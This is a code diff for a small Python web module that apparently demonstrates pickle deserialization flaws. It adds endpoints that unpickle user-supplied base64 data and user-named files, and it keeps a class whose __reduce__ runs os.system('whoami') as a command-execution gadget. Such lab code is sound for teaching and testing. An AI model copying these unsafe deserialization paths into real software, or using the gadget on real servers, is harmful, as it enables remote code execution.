@@ -6,13 +6,38 @@ import os
 import marshal
 
 
+
+
+def savePickleInFile():
+    file_name = "my_pickle_dump.txt"
+    p_dict = {'name': '张三', 'age': 30, 'isMarried': False}  # 定义一个字典
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    file_path = os.path.join(base_dir, file_name)
+    print(file_path)
+    with open(file_path, 'wb') as file:
+        pickle.dump(p_dict, file)
+    return SerializerJsonResponse(file_name)
+
+
+def exutePickleFromFile():
+    ser = request.form
+    if ser:
+        file_name = ser['fileName']
+    else:
+        return SerializerJsonResponse(None, 202, "params error")
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    file_path = os.path.join(base_dir, file_name)
+
+    with open(file_path, 'rb') as file:
+        p = pickle.load(file)
+    return SerializerJsonResponse(p)
+
 class A(object):
     def __init__(self):
         self.code = "ls"
 
     def __reduce__(self):
         return (os.system,('whoami',))
-
 
 def makePickleData():
     ser = request.form
@@ -21,24 +46,20 @@ def makePickleData():
     else:
         return SerializerJsonResponse(None, 202, "params error")
     a = A()
-    a.code = code
     p = pickle.dumps(a)
     a = base64.b64encode(p)
-
     return SerializerJsonResponse(a.decode('utf-8'))
 
 
-# pickle 序列化
+# pickle 读取序列化数据
 def getPickleData():
     ser = request.form
     if ser:
         code = ser['code']
     else:
         return SerializerJsonResponse(None, 202, "params error")
-
     origin_data = base64.b64decode(code)
     d = pickle.loads(origin_data)
-
     return SerializerJsonResponse(d)
 
 
